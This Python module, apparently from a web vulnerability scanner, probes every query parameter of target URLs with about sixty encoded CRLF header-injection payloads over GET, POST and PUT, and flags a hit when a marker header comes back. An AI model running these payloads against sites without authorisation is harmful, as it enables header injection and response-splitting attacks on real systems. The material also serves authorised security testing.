#!/usr/bin/env python3
from libs import NewRequest as nq
from core import green,info,rest
from urllib.parse import urljoin,urlparse
from libs import post_data
from queue import Queue
from threading import Thread
from random import randint

q = Queue()
payloads = [
"%0AHeader-Test:BLATRUC","%0A%20Header-Test:BLATRUC","%20%0AHeader-Test:BLATRUC","%23%OAHeader-Test:BLATRUC","%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC","%3F%0AHeader-Test:BLATRUC","crlf%0AHeader-Test:BLATRUC","crlf%0A%20Header-Test:BLATRUC","crlf%20%0AHeader-Test:BLATRUC","crlf%23%OAHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC","crlf%3F%0AHeader-Test:BLATRUC","%0DHeader-Test:BLATRUC","%0D%20Header-Test:BLATRUC","%20%0DHeader-Test:BLATRUC","%23%0DHeader-Test:BLATRUC","%23%0AHeader-Test:BLATRUC","%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC","%3F%0DHeader-Test:BLATRUC","crlf%0DHeader-Test:BLATRUC","crlf%0D%20Header-Test:BLATRUC","crlf%20%0DHeader-Test:BLATRUC","crlf%23%0DHeader-Test:BLATRUC","crlf%23%0AHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC","crlf%3F%0DHeader-Test:BLATRUC","%0D%0AHeader-Test:BLATRUC","%0D%0A%20Header-Test:BLATRUC","%20%0D%0AHeader-Test:BLATRUC","%23%0D%0AHeader-Test:BLATRUC","\r\nHeader-Test:BLATRUC"," \r\n Header-Test:BLATRUC","\r\n Header-Test:BLATRUC","%5cr%5cnHeader-Test:BLATRUC","%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC","%3F%0D%0AHeader-Test:BLATRUC","crlf%0D%0AHeader-Test:BLATRUC","crlf%0D%0A%20Header-Test:BLATRUC","crlf%20%0D%0AHeader-Test:BLATRUC","crlf%23%0D%0AHeader-Test:BLATRUC","crlf\r\nHeader-Test:BLATRUC","crlf%5cr%5cnHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC","crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC","crlf%3F%0D%0AHeader-Test:BLATRUC","%0D%0A%09Header-Test:BLATRUC","crlf%0D%0A%09Header-Test:BLATRUC","%250AHeader-Test:BLATRUC","%25250AHeader-Test:BLATRUC","%%0A0AHeader-Test:BLATRUC","%25%30AHeader-Test:BLATRUC","%25%30%61Header-Test:BLATRUC","%u000AHeader-Test:BLATRUC","//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC","/www.google.com/%2E%2E%2F%0D%0AHeader-Test:BLATRUC","/google.com/%2F..%0D%0AHeader-Test:BLATRUC"
        ]

def inject(host):
    for param in host.split('?')[1].split('&'):
        done = 0
        for payload in payloads:
            r = nq.Get(host.replace(param,param + payload))
            if r != 0:
                for header,value in r.headers.items():
                    if header == 'Header-Test':
                        if value == 'BLATRUC':
                            print(f'[{green}CRLF{rest}] Found :> {host.replace(param,param + payload)}')
                            done = 1
            if done == 1:
                break
    for param in host.split('?')[1].split('&'):
        done = 0
        for payload in payloads:
            data = urlparse(host.replace(param,param + payload)).query
            d = post_data(data)
            r = nq.Post(host.split('?')[0],d)
            if r != 0:
                for header,value in r.headers.items():
                    if header == 'Header-Test':
                        if value == 'BLATRUC':
                            print(f'[{green}CRLF{rest}] Found :> {host}\n{info} Method :> POST\n{info} Data :> {data}')
                            done = 1
            if done == 1:
                break
    for param in host.split('?')[1].split('&'):
        done = 0
        for payload in payloads:
            data = urlparse(host.replace(param,param + payload)).query
            d = post_data(data)
            r = nq.Put(host.split('?')[0],d)
            if r != 0:
                for header,value in r.headers.items():
                    if header == 'Header-Test':
                        if value == 'BLATRUC':
                            print(f'[{green}CRLF{rest}] Found :> {host}\n{info} Method :> PUT\n{info} Data :> {data}')
                            done = 1
            if done == 1:
                break

def threader():
    while True:
        item = q.get()
        inject(item)
        q.task_done()
def run(opts):
    for _ in range(opts['threads']):
        p = Thread(target=threader)
        p.daemon = True
        p.start()
    for url in opts['url']:
        q.put(url)
    q.join()
